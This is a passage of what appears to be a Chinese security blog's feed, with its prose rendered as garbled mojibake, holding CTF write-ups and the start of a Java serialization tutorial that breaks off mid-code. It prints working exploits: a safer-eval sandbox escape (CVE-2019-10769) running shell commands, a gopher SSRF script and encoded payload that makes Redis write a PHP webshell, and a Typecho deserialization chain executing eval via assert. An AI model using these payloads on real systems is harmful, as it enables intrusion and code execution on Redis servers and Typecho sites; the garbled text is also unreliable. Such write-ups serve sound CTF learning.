&#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„æ ¸å¿ƒä»£ç åœ¨worker2åˆ°worker3ä¹‹é—´ï¼Œæˆ‘ä»¬å‘ç°å¦‚æœdelayè¢«è®¾ç½®æˆäº†60*1000</p>
<p>è€Œè¶…æ—¶æ˜¯1000.å¦‚æœæ²¡æœ‰è¶…æ—¶ï¼Œåè€Œä¼šnextï¼Œä¹Ÿå°±æ˜¯ä¼šç»§ç»­æ‰§è¡Œä»£ç ï¼Œå¦åˆ™ç›´æ¥å¼¹å›å»è¶…æ—¶ï¼Œäºæ˜¯æˆ‘ä»¬çœ‹ä¸‹ä¸€æ­¥</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢ä½¿ç”¨äº†saferEvalçš„ä»£ç ï¼Œæ¥æ”¶eçš„å‚æ•°ï¼Œäºæ˜¯æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ¸…æ™°ï¼Œé¦–å…ˆå°è¯•ç»•è¿‡å¯¹è¶…æ—¶çš„é™åˆ¶ï¼Œå†æœä¸€ä¸‹saferEvalçš„æ•°æ®~ï¼Œæ–‡æ¡£è¯´åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parseInt(string, radix)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">å‚æ•°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">string</td>
<td align="left">å¿…éœ€ã€‚è¦è¢«è§£æçš„å­—ç¬¦ä¸²ã€‚</td>
</tr>
<tr>
<td align="left">radix</td>
<td align="left">å¯é€‰ã€‚è¡¨ç¤ºè¦è§£æçš„æ•°å­—çš„åŸºæ•°ã€‚è¯¥å€¼ä»‹äº 2 ~ 36 ä¹‹é—´ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°æˆ–å…¶å€¼ä¸º 0ï¼Œåˆ™æ•°å­—å°†ä»¥ 10 ä¸ºåŸºç¡€æ¥è§£æã€‚å¦‚æœå®ƒä»¥ â€œ0xâ€ æˆ– â€œ0Xâ€ å¼€å¤´ï¼Œå°†ä»¥ 16 ä¸ºåŸºæ•°ã€‚å¦‚æœè¯¥å‚æ•°å°äº 2 æˆ–è€…å¤§äº 36ï¼Œåˆ™ parseInt() å°†è¿”å› NaNã€‚</td>
</tr>
</tbody></table>
<p>è¿™ä¹Ÿå°±è¯´æ˜ï¼Œå¦‚æœä¼ å…¥delayæ˜¯å¾ˆå¤§å¾ˆå¤§çš„æ•°ï¼Œä¹Ÿå°±ä¸èƒ½è¢«è§£æäº†ï¼Œé‚£æˆ‘ä»¬çš„delayæ­¤æ—¶å˜æˆäº†1ç§’ï¼Œä¹Ÿå°±ç»•è¿‡äº†è¶…æ—¶é™åˆ¶ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œå’¯ï¼Œå°è¯•ï¼š</p>
<p><img src="..%5Cimages%5Cimage-20201027214654296.png" alt="image-20201027214654296"></p>
<p>å‘ç°æ­¤æ—¶å°±ç»•è¿‡äº†è¶…æ—¶çš„é™åˆ¶äº†ï¼ï¼Œäºæ˜¯å†æ„é€ æ‰§è¡ŒEvalSaferçš„ä»£ç ï¼ŒæŸ¥åˆ°æ˜¯CVE-2019-10769</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10</span><br></pre></td></tr></table></figure>

<p>payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&quot;./src/index&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> theFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> process = clearImmediate.constructor(<span class="string">&quot;return process;&quot;</span>)();</span><br><span class="line">  <span class="keyword">return</span> process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`(<span class="subst">$&#123;theFunction&#125;</span>)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æ ¸å¿ƒä»£ç å°±æ˜¯theFunctionï¼Œæˆ‘ä»¬ä¼ å…¥è¿›å»æ±¡æŸ“å‚æ•°å³å¯æ‰§è¡Œä»£ç </p>
<p><img src="image-20201028121332238.png" alt="image-20201028121332238"></p>
<h1 id="4-EzWeb"><a href="#4-EzWeb" class="headerlink" title="4.EzWeb"></a>4.EzWeb</h1><p>æ˜¯ä¸€ä¸ªredisçš„é¢˜ç›®..æ²¡æœ‰åšè¿‡è¿™æ ·çš„ï¼Œç¡¬ç€å¤´çš®åšå§ï¼Œè®¿é—®ä¹‹åæ ¹æ®æç¤ºè®¿é—® ?secret</p>
<p><img src="image-20201028124819584.png" alt="image-20201028124819584"></p>
<p>æŸ¥è¯¢äº†ä¸€äº›ï¼Œè¿™æ˜¯å†…ç½‘çš„ç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯è¯´è™½ç„¶é¢˜ç›®è¿‡æ»¤äº†127.0.0.1,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æµ‹è¯•å…¶ä»–é¶æœºçš„å†…å®¹</p>
<p><img src="image-20201028125140003.png" alt="image-20201028125140003"></p>
<p>è®¿é—®è¿‡å»ä¹‹åå¥½åƒä¹Ÿä¸æ˜¯å•¥ç©æ„å„¿å•Š,å°è¯•ç”¨fileåè®®çš„æ¼æ´è¯»åˆ°äº†index.phpçš„æºç ï¼š</p>
<p>file:[ç©ºæ ¼]/</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;æäº¤</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--?secret--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;åˆ«è¿™æ ·&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°è¿‡æ»¤äº†dictåè®®ï¼Œfileåè®®ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤httpåè®®å’Œgopheråè®®ï¼Œæˆ‘ä»¬çŒœæƒ³å‡ºé¢˜äººæƒ³è®©æˆ‘ä»¬åˆ©ç”¨httpåè®®è¿›è¡Œå†…ç½‘æ¢æµ‹ï¼Œgopheråè®®è¿›è¡Œæ”»å‡»,æœç„¶ï¼Œåœ¨11ç«¯å£ä¸Šæ‰¾åˆ°äº†å˜åŒ–</p>
<p><img src="image-20201028132212757.png" alt="image-20201028132212757"></p>
<p>è®©æˆ‘ä»¬å°è¯•æœåŠ¡ï¼Œå› ä¸ºssrfå¸¸ç”¨çš„å‡ ä¸ªæœåŠ¡å°±æ˜¯mysqlå’Œredisï¼Œäºæ˜¯åˆ†åˆ«è®¿é—®3306ç«¯å£å’Œ6379ç«¯å£</p>
<p>6379ä¸Šå¾—åˆ°ï¼š</p>
<p><img src="image-20201028132532651.png" alt="image-20201028132532651"></p>
<p>å‘ç°æœç„¶æœ‰ERRç«¯å£ï¼Œäºæ˜¯å°è¯•ç”¨gopheråè®®æ‰“ä¸€æ³¢ï¼Œè¿™é‡Œç›´æ¥ç”¨äº†ä¸€æ³¢åˆ«äººçš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.96.119.11&quot;</span>      // è¿è¡Œæœ‰redisçš„ä¸»æœºip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="built_in">print</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ”¹ä¸€ä¸‹ä¸»æœºIPä¸º:10.160.187.11</p>
<p>å¾—åˆ°payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>

<h1 id="5-EZä¸‰å‰‘å®¢-EzTypecho"><a href="#5-EZä¸‰å‰‘å®¢-EzTypecho" class="headerlink" title="5.EZä¸‰å‰‘å®¢-EzTypecho"></a>5.EZä¸‰å‰‘å®¢-EzTypecho</h1><p>è¿™é“é¢˜ç›®ï¼Œå‘ƒï¼ŒåŸç†æ¯”è¾ƒéš¾ï¼Œä½†æ˜¯åˆ©ç”¨èµ·æ¥å´å¾ˆç®€å•ï¼Œæ¯”å¦‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­å¯ä»¥æ‰¾åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html</span><br></pre></td></tr></table></figure>

<p>expå°±å¯ä»¥æ‰¾åˆ°äº†ï¼Œåœ¨åšé¢˜çš„æ—¶å€™ç›´æ¥åœ¨finishæ—¶ä¼šå‘ç°æ— æ³•åˆ©ç”¨çš„æƒ…å†µ</p>
<p><img src="image-20201028171811386.png" alt="image-20201028171811386"></p>
<p>è¿™ä¸ªæ—¶å€™å°±å¿…é¡»çœ‹æºç äº†</p>
<p>æŸ¥æ‰¾sessionï¼Œåœ¨æºç ä¸­å¯ä»¥æ‰¾åˆ°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">else</span> : <span class="meta">?&gt;</span></span><br><span class="line">               <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no, you can\&#x27;t unserialize it without session QAQ&#x27;</span>);&#125;</span><br><span class="line">               $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">               Typecho_Cookie::delete(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line">               $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">&#x27;adapter&#x27;</span>], $config[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line">               $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">               Typecho_Db::set($db);</span><br><span class="line">               <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å»æŸ¥æ‰¾sesionåœ¨å“ªé‡Œèµ‹å€¼ï¼š</p>
<p><img src="image-20201028172113525.png" alt="image-20201028172113525"></p>
<p>ç»“æœå‘ç°ä¸€æ—¦åœ¨è¿™é‡Œå°±è¢«exitåœä¸‹æ¥äº†ï¼Œäºæ˜¯æŸ¥æ‰¾startï¼Œç»“æœå‘ç°æºç å½“ä¸­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                        $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">                        $type = explode(<span class="string">&#x27;_&#x27;</span>, $config[<span class="string">&#x27;adapter&#x27;</span>]);</span><br><span class="line">                        $type = array_pop($type);</span><br></pre></td></tr></table></figure>

<p>å‘ç°å®ƒå±…ç„¶æ¥æ”¶ä¸€ä¸ªå‚æ•°â€¦é‚£è¿™æ ·çš„è¯æˆ‘ä»¬ç”¨è¿™ä¸ªå»æ‰“å°±è¡Œäº†ï¼Œåˆ©ç”¨è„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">&quot;RSS 2.0&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;title&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;link&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span> =&gt; <span class="string">&quot;20190430&quot;</span>,</span><br><span class="line">                <span class="string">&quot;author&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;screenName&quot;</span> =&gt; <span class="string">&quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">&quot;assert&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;adapter&quot;</span> =&gt; $a,</span><br><span class="line">    <span class="string">&quot;prefix&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($c));</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flagï¼š</p>
<p><img src="image-20201028172325171.png" alt="image-20201028172325171"></p>
<h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>â€‹    é¢˜ç›®è™½ç„¶åŸç†éƒ½å¾ˆéš¾ï¼Œä½†æ˜¯åˆ©ç”¨å´å¾ˆç®€å•ï¼Œè‡ªå·±å…ˆæŠŠé¢˜ç›®æˆåŠŸçš„å¤ç°æ¥å‡ºæ¥äº†ï¼Œä»¥åå†é€æ­¥å¤ç°åŸç†æŠŠã€‚</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>php</tag>
        <tag>æ¸—é€</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaSerialize</title>
    <url>/2020/11/02/JavaSerialize/</url>
    <content><![CDATA[<p>JAVAå½“ä¸­å¯¹äºæ–‡ä»¶çš„å¤„ç†éƒ½æ˜¯é€šè¿‡IOæµè¿›è¡Œæ“ä½œçš„</p>
<h1 id="ä¸€äº›IOæµçš„API"><a href="#ä¸€äº›IOæµçš„API" class="headerlink" title="ä¸€äº›IOæµçš„API"></a>ä¸€äº›IOæµçš„API</h1><ul>
<li>FileOutputStream  å†™å…¥æµï¼Œæˆ‘ä»¬ç”¨è¯¥æµå¯ä»¥å†™å…¥å†…å®¹åˆ°æ–‡ä»¶å½“ä¸­</li>
<li>FileInputStream   è¯»å–æµ</li>
<li>ObjectOutputStream è¯¥æµå¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡å†™å‡ºï¼Œæˆ–è€…è¯»å–ä¸€ä¸ªå¯¹è±¡åˆ°ç¨‹åºä¸­ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œäº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œã€‚</li>
<li>ObjectInputStream  ååºåˆ—åŒ–å¹¶æ‰“å°æ•°æ®</li>
</ul>
<h1 id="JAVAååºåˆ—åŒ–è¿‡ç¨‹"><a href="#JAVAååºåˆ—åŒ–è¿‡ç¨‹" class="headerlink" title="JAVAååºåˆ—åŒ–è¿‡ç¨‹"></a>JAVAååºåˆ—åŒ–è¿‡ç¨‹</h1><p>é¦–å…ˆæˆ‘ä»¬è¦æ˜ç™½ï¼ŒJavaçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String obj = <span class="string">&quot;ls &quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†åºåˆ—åŒ–å¯¹è±¡å†™å…¥æ–‡ä»¶aa.serä¸­</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;aa.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// aa.serä¸­è¯»å–æ•°æ®</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;aa.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡obj,æ³¨æ„è¿™é‡Œä½¿ç”¨å¼ºè½¬</span></span><br><span class="line">        String obj2 = (String)ois.readObject();</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è¿™ä¸²ä»£ç ï¼Œæˆ‘ä»¬å°†æ•°æ®lsä¼ å…¥åˆ°äº†aa.serå½“ä¸­ï¼Œå¹¶ä¸”å°†å…¶é‡æ–°é‡Šæ”¾äº†å‡ºæ¥ã€‚æˆ‘ä»¬æˆåŠŸé€šè¿‡å†™å…¥åºåˆ—åŒ–æ–‡ä»¶å¹¶å°†å…¶æˆåŠŸè¿”å›ã€‚</p>
<p>å®ç°Serializableå’ŒExternalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ã€‚æ•…æˆ‘ä»¬å†™ä¸€ä¸ªä¾‹å­</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.text.MessageFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SerializePerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setAge(<span class="number">19</span>);</span><br><span class="line">        person.setName(<span class="string">&quot;sakani&quot;</span>);</span><br><span class="line">      <span class="comment">//  person.setSex(true);</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Demo2.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(person);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å› ä¸ºæ–‡ä»¶å¯èƒ½ä¸å­˜åœ¨ï¼Œæ­¤æ—¶éœ€è¦å¤„ç†å¼‚å¸¸</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Person <span class="title">UnSerializePerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        è¯»å–æ–‡ä»¶</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;Demo2.txt&quot;</span>));</span><br><span class="line"><span class="comment">//        åˆ°è¿™ä¸€æ­¥æ¥è¯»å–äº†æ–‡ä»¶æµï¼Œä¸‹ä¸€æ­¥å°†å…¶å¼ºè½¬å›å¯¹è±¡</span></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"><span class="comment">//        readObject æ˜¯ç”¨æ¥è¯»å–è¯¥æµå½“ä¸­çš„å¯¹è±¡</span></span><br><span class="line">        Person person2 =  (Person)objectInputStream.readObject();</span><br><span class="line">        System.out.println(person2.getAge());</span><br><span class="line">        <span class="keyword">return</span> person2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        SerializePerson();</span><br><span class="line"><span class="comment">//        è¿™ä¸ªæ–¹æ³•ç”¨äºåºåˆ—åŒ–å‡½æ•°</span></span><br><span class="line">        Person person2 = UnSerializePerson();</span><br><span class="line">        System.out.println(MessageFormat.format(<span class="string">&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;</span>,person2.getName(),person2.getAge()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 